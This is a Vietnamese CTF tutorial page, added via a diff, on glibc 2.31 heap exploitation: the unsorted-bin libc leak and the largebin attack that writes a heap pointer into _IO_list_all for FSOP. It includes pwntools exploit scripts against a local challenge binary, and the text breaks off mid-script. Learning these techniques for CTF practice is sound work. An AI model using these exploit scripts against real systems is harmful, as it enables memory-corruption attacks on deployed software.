@@ -1,0 +1,485 @@
+<title>Unsorted & Largebin</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,46px);line-height:1.03;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:140px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.pick{display:flex;gap:6px;flex-wrap:wrap;margin:14px 0}
+.pick button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px;cursor:pointer}
+.pick button.active{background:var(--accent);color:#fff;border-color:var(--accent)}
+.stage{border:1px solid var(--line);border-radius:12px;padding:16px;background:var(--surface-2);font-size:15px;min-height:120px}
+.stage h4{margin:0 0 6px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 4 · Bài 21</div>
+    <h1>Unsorted &amp; Largebin</h1>
+    <p class="sub">Ba kỹ thuật quanh bin double-linked, đi <strong>số thật glibc 2.31</strong>: <strong>Unsorted leak</strong> (đọc fd/bk = địa chỉ libc), và <strong>Largebin attack</strong> (ghi một con trỏ heap do ta chọn vào đích tùy ý — bàn đạp FSOP). Dùng khi chunk vượt tcache/fastbin (&gt;0x410).</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 4)</span>
+      <span class="chip"><b>glibc mẫu:</b> 2.31</span>
+      <span class="chip"><b>Cần trước:</b> <a href="heap_internals.html" style="color:inherit">heap_internals</a>, <a href="heap_bugs.html" style="color:inherit">heap_bugs</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~60 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Leak</a><a href="#s4">04 Largebin</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Unsorted leak:</strong> chunk vào unsorted có <code>fd/bk</code> trỏ về <mark>main_arena</mark> (trong libc). UAF-read fd → leak libc. Ở 2.31 giá trị = <code>libc + 0x1ecbe0</code> → <code>libc.base = leak − 0x1ecbe0</code>. Kỹ thuật leak libc phổ biến nhất của heap.</p>
+    <p><strong>Largebin attack:</strong> khi một chunk đi từ unsorted → largebin, glibc ghi con trỏ của nó vào trường <code>bk_nextsize</code> của chunk largebin khác. Làm hỏng <code>bk_nextsize</code> → ép glibc ghi <strong>địa chỉ chunk ta kiểm soát</strong> vào <mark>đích tùy ý</mark> (ghi một con trỏ heap vào bất kỳ đâu).</p>
+    <p><strong>Dùng khi:</strong> chunk vượt tcache (&gt;0x410) / tcache đầy → rơi vào unsorted → small/large.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>unsorted = nguồn leak libc; largebin attack = ghi một con trỏ heap vào một địa chỉ bạn chọn (thường để dựng FSOP).</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — tra nhanh khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">💧 Unsorted leak (90% đề heap)</span>
+<pre><code>a=malloc(0x4f8); b=malloc(0x18)   <span class="c"># b=chunk chặn, tránh gộp top</span>
+free(a)                            <span class="c"># a → unsorted, fd=bk=main_arena+0x60</span>
+leak = u64(show(a)[:8])            <span class="c"># 2.31: = libc+0x1ecbe0</span>
+libc.base = leak - 0x1ecbe0</code></pre></div>
+      <div class="combat-row"><span class="lab">🎯 Largebin attack (ghi 1 con trỏ)</span>
+        <p>Hiệu ứng: <code>*(target) = &amp;chunk2</code> (một địa chỉ heap). Dùng để đặt con trỏ heap vào <code>_IO_list_all</code> / một con trỏ trong struct → nối sang <a href="fsop.html">FSOP</a>/<a href="house_of_apple2.html">apple2</a>.</p></div>
+      <div class="combat-row"><span class="lab">🧱 Điều kiện largebin</span>
+        <p>chunk1 LỚN hơn chunk2 (cùng largebin index). chunk1 đã ở largebin, ghi được <code>chunk1.bk_nextsize = target − 0x20</code> (UAF/overflow). Free chunk2 (nhỏ hơn) → trigger → <code>*(target) = &amp;chunk2</code>.</p></div>
+      <div class="combat-row"><span class="lab">🧩 Bảng-byte chunk largebin</span>
+<pre><code>+0x10 fd            +0x18 bk
++0x20 fd_nextsize   +0x28 bk_nextsize  ← sửa cái này = target-0x20</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p>size ≤0x410: làm <b>đầy tcache cùng size</b> (7 free) trước khi free vào unsorted để leak. glibc ≥2.30 siết check largebin (<code>bk_nextsize</code> phải hợp lệ) — dựng cả <code>fd_nextsize</code>. Xác nhận bằng <code>largebins</code> + <code>watch</code>.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Bin double-linked</h2>
+  <p>Khác tcache/fastbin (đơn, chỉ <code>fd</code>), unsorted/small/large là <strong>danh sách đôi</strong>: mỗi chunk có <code>fd</code> (tiến) và <code>bk</code> (lùi). Largebin thêm <code>fd_nextsize</code>/<code>bk_nextsize</code> để nối các chunk <em>khác kích thước</em> trong cùng bin theo thứ tự lớn→nhỏ.</p>
+
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">unsorted bin</div><p>Hàng chờ: chunk vừa free (lớn) nằm tạm trước khi phân loại.</p></div>
+    <div class="card"><div class="term">main_arena</div><p>Struct quản lý arena, trong libc. fd/bk của chunk unsorted cuối trỏ vào đây → leak.</p></div>
+    <div class="card"><div class="term">largebin</div><p>Bin cho chunk ≥0x400, nhiều size/bin, dùng nextsize nối.</p></div>
+    <div class="card"><div class="term">fd_nextsize/bk_nextsize</div><p>Con trỏ nối chunk khác size trong largebin (tại +0x20/+0x28).</p></div>
+  </div>
+  <div class="note"><span class="tag">Liên hệ</span>Bài <a href="heap_internals.html">heap_internals</a> đã giới thiệu các bin &amp; số <code>0x1ecbe0</code>. Ở đây ta <em>khai thác</em> cấu trúc double-link của unsorted &amp; large.</div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Hai thứ heap luôn cần</h2>
+  <p>Mọi lời giải heap cần hai thứ: <strong>(1) leak</strong> để phá ASLR (biết libc ở đâu) và <strong>(2) một ghi điều khiển</strong>. Unsorted cho bạn (1) gần như miễn phí. Largebin attack cho bạn một dạng (2) đặc biệt — ghi một con trỏ heap vào đích — rất hợp để dựng bàn đạp FSOP (đặt con trỏ fake FILE vào <code>_IO_list_all</code>).</p>
+  <p>Khi chunk quá lớn để vào tcache/fastbin (phổ biến ở đề "chọn size tự do"), đây là bộ công cụ chính.</p>
+ </div>
+</section>
+
+<!-- 03 Leak -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / UNSORTED LEAK · MỤC LÕI</div>
+  <h2>Vì sao fd/bk = địa chỉ libc (số thật)</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 600 130" role="img" aria-label="Chunk free duy nhất trong unsorted có fd và bk đều trỏ về main_arena trong libc" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs><marker id="au" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="#3a6ea5" stroke="none"/></marker></defs>
+    <rect x="40" y="46" width="180" height="44" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="130" y="66" text-anchor="middle" font-size="12" fill="#e8663e" stroke="none" font-family="monospace">chunk free (unsorted)</text>
+    <text x="130" y="82" text-anchor="middle" font-size="10.5" fill="#e8663e" stroke="none" font-family="monospace">fd/bk ở +0x10/+0x18</text>
+    <rect x="390" y="30" width="180" height="70" rx="8" stroke-width="1.5" stroke="#3a6ea5"/>
+    <text x="480" y="56" text-anchor="middle" font-size="12" fill="#3a6ea5" stroke="none" font-family="monospace">main_arena+0x60</text>
+    <text x="480" y="74" text-anchor="middle" font-size="10.5" fill="#3a6ea5" stroke="none" font-family="monospace">= libc+0x1ecbe0</text>
+    <line x1="222" y1="60" x2="388" y2="52" stroke="#3a6ea5" stroke-width="1.5" marker-end="url(#au)"/>
+    <line x1="222" y1="76" x2="388" y2="82" stroke="#3a6ea5" stroke-width="1.5" marker-end="url(#au)"/>
+    <text x="305" y="44" font-size="10.5" fill="#3a6ea5" stroke="none" font-family="monospace">fd →</text>
+    <text x="305" y="100" font-size="10.5" fill="#3a6ea5" stroke="none" font-family="monospace">bk →</text>
+    <text x="300" y="122" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">1 chunk duy nhất → fd=bk= địa chỉ cố định trong libc. show(chunk) = leak.</text>
+  </svg>
+  <figcaption>Khi unsorted chỉ có 1 chunk, fd/bk của nó chính là main_arena+0x60 (libc).</figcaption>
+  </figure>
+  <h3>Quy trình leak (số thật 2.31)</h3>
+  <pre><code><span class="c"># x/2gx &amp;a_data  sau free(a) (chunk 0x500, heap 0x405000):</span>
+0x4052b0:  0x00007ffff7facbe0  0x00007ffff7facbe0   <span class="c"># fd = bk = libc+0x1ecbe0</span>
+leak = 0x7ffff7facbe0
+libc.base = 0x7ffff7facbe0 - 0x1ecbe0 = 0x7ffff7dc0000   <span class="c"># kết thúc 000 ✓</span></code></pre>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Đưa chunk vào unsorted</h4><p>Alloc chunk &gt;0x410 (vượt tcache) + chunk chặn; free chunk lớn.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>UAF-read fd</h4><p><code>show</code> chunk đã free → 8 byte đầu = fd = <code>main_arena + 0x60</code>.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Rebase</h4><p><code>libc.address = leak − 0x1ecbe0</code>. OFF lấy bằng gdb nếu version khác.</p></div></div>
+  <div class="note tip"><span class="tag">≤0x410?</span>Nếu đề giới hạn size nhỏ: free đủ 7 chunk cùng size để làm đầy tcache, chunk thứ 8 mới vào unsorted → leak.</div>
+ </div>
+</section>
+
+<!-- 04 Largebin -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / LARGEBIN ATTACK</div>
+  <h2>Ghi một con trỏ heap vào đích (số thật)</h2>
+  <p>Khi một chunk rời unsorted để vào largebin, glibc chèn nó đúng thứ tự kích thước và <strong>cập nhật các con trỏ nextsize</strong>. Nếu ta đã sửa <code>bk_nextsize</code> của chunk đang có trong largebin thành <code>target − 0x20</code>, phép chèn khiến glibc thực hiện (rút gọn từ <code>_int_malloc</code>):</p>
+  <pre><code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim
+<span class="c"># với bk_nextsize đã bị ta trỏ tới (target-0x20):</span>
+<span class="c"># → *((target-0x20) + 0x20) = *(target) = &amp;victim   (victim = chunk2 ta vừa cho vào largebin)</span></code></pre>
+
+  <h3>Bảng-byte chunk largebin (các trường, số thật)</h3>
+  <div class="frame">
+    <div class="fr"><span class="o">chunk1+0x08</span><span>size = <code>0x431</code> (chunk 0x430, PREV_INUSE)</span></div>
+    <div class="fr"><span class="o">chunk1+0x10</span><span>fd — tiến (double-link)</span></div>
+    <div class="fr"><span class="o">chunk1+0x18</span><span>bk — lùi</span></div>
+    <div class="fr"><span class="o">chunk1+0x20</span><span>fd_nextsize — chunk size lớn hơn kế</span></div>
+    <div class="fr key"><span class="o">chunk1+0x28</span><span><b>bk_nextsize</b> ← ghi <code>p64(_IO_list_all − 0x20)</code> → glibc ghi &amp;chunk2 vào _IO_list_all</span></div>
+  </div>
+
+  <h3>Quy trình (số thật, chunk1=0x430, chunk2=0x420)</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Chunk1 (0x430) vào largebin</h4><p>Alloc chunk1, free → unsorted → alloc chunk lớn khác (ép duyệt) → chunk1 bị đẩy vào largebin.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Sửa bk_nextsize của chunk1</h4><p>Qua UAF/overflow: <code>edit(chunk1, b"A"*0x20 + p64(fd) + p64(bk) + p64(fd_ns) + p64(io_list_all − 0x20))</code>.</p></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Chunk2 (0x420) nhỏ hơn vào cùng largebin</h4><p>Free chunk2 → unsorted → alloc ép duyệt → glibc chèn chunk2 → ghi <code>*(io_list_all) = &amp;chunk2</code>.</p></div></div>
+  <div class="note warn"><span class="tag">Thành thật</span>Điều kiện size (chunk1 &gt; chunk2, cùng largebin index) và các check <code>largebin_corrupted</code> khác theo version. Đây là kỹ thuật "ghi con trỏ heap vào target" — không tự cho shell; thường ghép FSOP (đặt fake FILE tại chunk2, _IO_list_all giờ trỏ tới nó). Xác nhận từng bước bằng gdb <code>largebins</code> + <code>watch *(long*)&amp;_IO_list_all</code>.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap">
+  <div class="secnum">05 / MÔ PHỎNG</div>
+  <h2>Chunk đi về bin nào?</h2>
+  <p>Chọn kịch bản để xem chunk rơi vào bin nào và có leak/largebin được không.</p>
+  <div class="lab">
+    <div class="pick" id="pick">
+      <button data-s="0" class="active">free chunk 0x500 (+chặn)</button>
+      <button data-s="1">free chunk 0x40 (×1)</button>
+      <button data-s="2">free 8× chunk 0x40</button>
+      <button data-s="3">largebin: 0x430 rồi 0x420</button>
+    </div>
+    <div class="stage" id="stage"></div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Quan sát trong GDB</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Xem unsorted/large</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> bins          <span class="c"># unsortedbin: fd/bk = main_arena</span>
+<span class="p">pwndbg&gt;</span> largebins     <span class="c"># chi tiết largebin + nextsize</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Tính offset leak &amp; đích</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> p/x 0x7ffff7facbe0 - 0x7ffff7dc0000   <span class="c"># = 0x1ecbe0</span>
+<span class="p">pwndbg&gt;</span> p &amp;_IO_list_all                      <span class="c"># đích largebin</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Theo dõi ghi largebin</h4>
+    <pre><code><span class="p">pwndbg&gt;</span> watch *(long*)&amp;_IO_list_all   <span class="c"># dừng khi glibc ghi &amp;chunk2</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Unsorted leak + phác largebin → FSOP (glibc 2.31)</h2>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — unsorted leak số thật, rồi largebin attack ghi _IO_list_all.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+<span class="c"># alloc(i,sz,data) / free(i) / edit(i,data) / show(i)</span>
+
+<span class="c"># ---- Unsorted leak ----</span>
+alloc(<span class="d">0</span>, <span class="d">0x4f8</span>); alloc(<span class="d">1</span>, <span class="d">0x18</span>)   <span class="c"># 1 = chặn</span>
+free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+<span class="k">assert</span> libc.address &amp; <span class="d">0xfff</span> == <span class="d">0</span>
+io_list_all = libc.sym._IO_list_all
+log.success(<span class="s">f"libc={hex(libc.address)}  _IO_list_all={hex(io_list_all)}"</span>)
+
+<span class="c"># ---- Largebin attack: *(io_list_all) = &amp;chunk2 ----</span>
+<span class="c"># 1) chunk1(0x430) vào largebin; 2) edit bk_nextsize = io_list_all-0x20;</span>
+<span class="c"># 3) chunk2(0x420) vào cùng largebin → trigger ghi.</span>
+<span class="c"># (chuỗi alloc/free cụ thể phụ thuộc menu đề — xem gdb largebins)</span>
+alloc(<span class="d">2</span>, <span class="d">0x428</span>); alloc(<span class="d">9</span>, <span class="d">0x18</span>)   <span class="c"># chunk1(0x430) + chặn</span>
+alloc(<span class="d">3</span>, <span class="d">0x418</span>); alloc(<span class="d">8</span>, <span class="d">0x18</span>)   <span class="c"># chunk2(0x420) + chặn</span>
+free(<span class="d">2</span>); alloc(<span class="d">4</span>, <span class="d">0x438</span>)          <span class="c"># chunk1 → unsorted → largebin</span>
+edit(<span class="d">2</span>, b<span class="s">"A"</span>*<span class="d">0x20</span> + p64(<span class="d">0</span>)*<span class="d">2</span> + p64(io_list_all - <span class="d">0x20</span>))  <span class="c"># bk_nextsize</span>
+free(<span class="d">3</span>); alloc(<span class="d">5</span>, <span class="d">0x438</span>)          <span class="c"># chunk2 vào largebin → *(io_list_all)=&amp;chunk2</span>
+<span class="c"># giờ _IO_list_all trỏ chunk2 (ta kiểm soát) → dựng fake FILE tại chunk2 → trigger exit (FSOP)</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Phần largebin minh họa <b>ý tưởng &amp; số thật offset</b>. Chuỗi alloc/free khớp menu đề &amp; các check theo version 2.31; dựng &amp; xác nhận từng bước bằng <code>largebins</code> + <code>watch</code>. Nối tiếp sang <a href="fsop.html">FSOP</a> để ra shell. (<code>_IO_list_all</code> offset tự có từ <code>libc.sym</code>.)</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools: leak gọn, libc.sym cho offset.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); alloc(<span class="d">1</span>,<span class="d">0x18</span>); free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+log.success(hex(libc.address))
+io_list = libc.sym._IO_list_all              <span class="c"># đích largebin → FSOP</span>
+<span class="c"># ... dựng largebin attack như bản A ...</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Mẹo</span>Luôn <code>alloc</code> chunk chặn sau chunk định free. Base libc hợp lệ phải kết thúc <code>000</code>. Dùng <code>largebins</code> kiểm chunk1 đã vào largebin trước khi edit bk_nextsize.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld: Menu + rebase_libc.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); GDB(); m = Menu(prompt=b<span class="s">"&gt;"</span>)
+m.alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); m.alloc(<span class="d">1</span>,<span class="d">0x18</span>); m.free(<span class="d">0</span>)
+rebase_libc(leak=u64(m.show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)), offset=<span class="d">0x1ecbe0</span>)
+log.success(hex(LIBC.address))
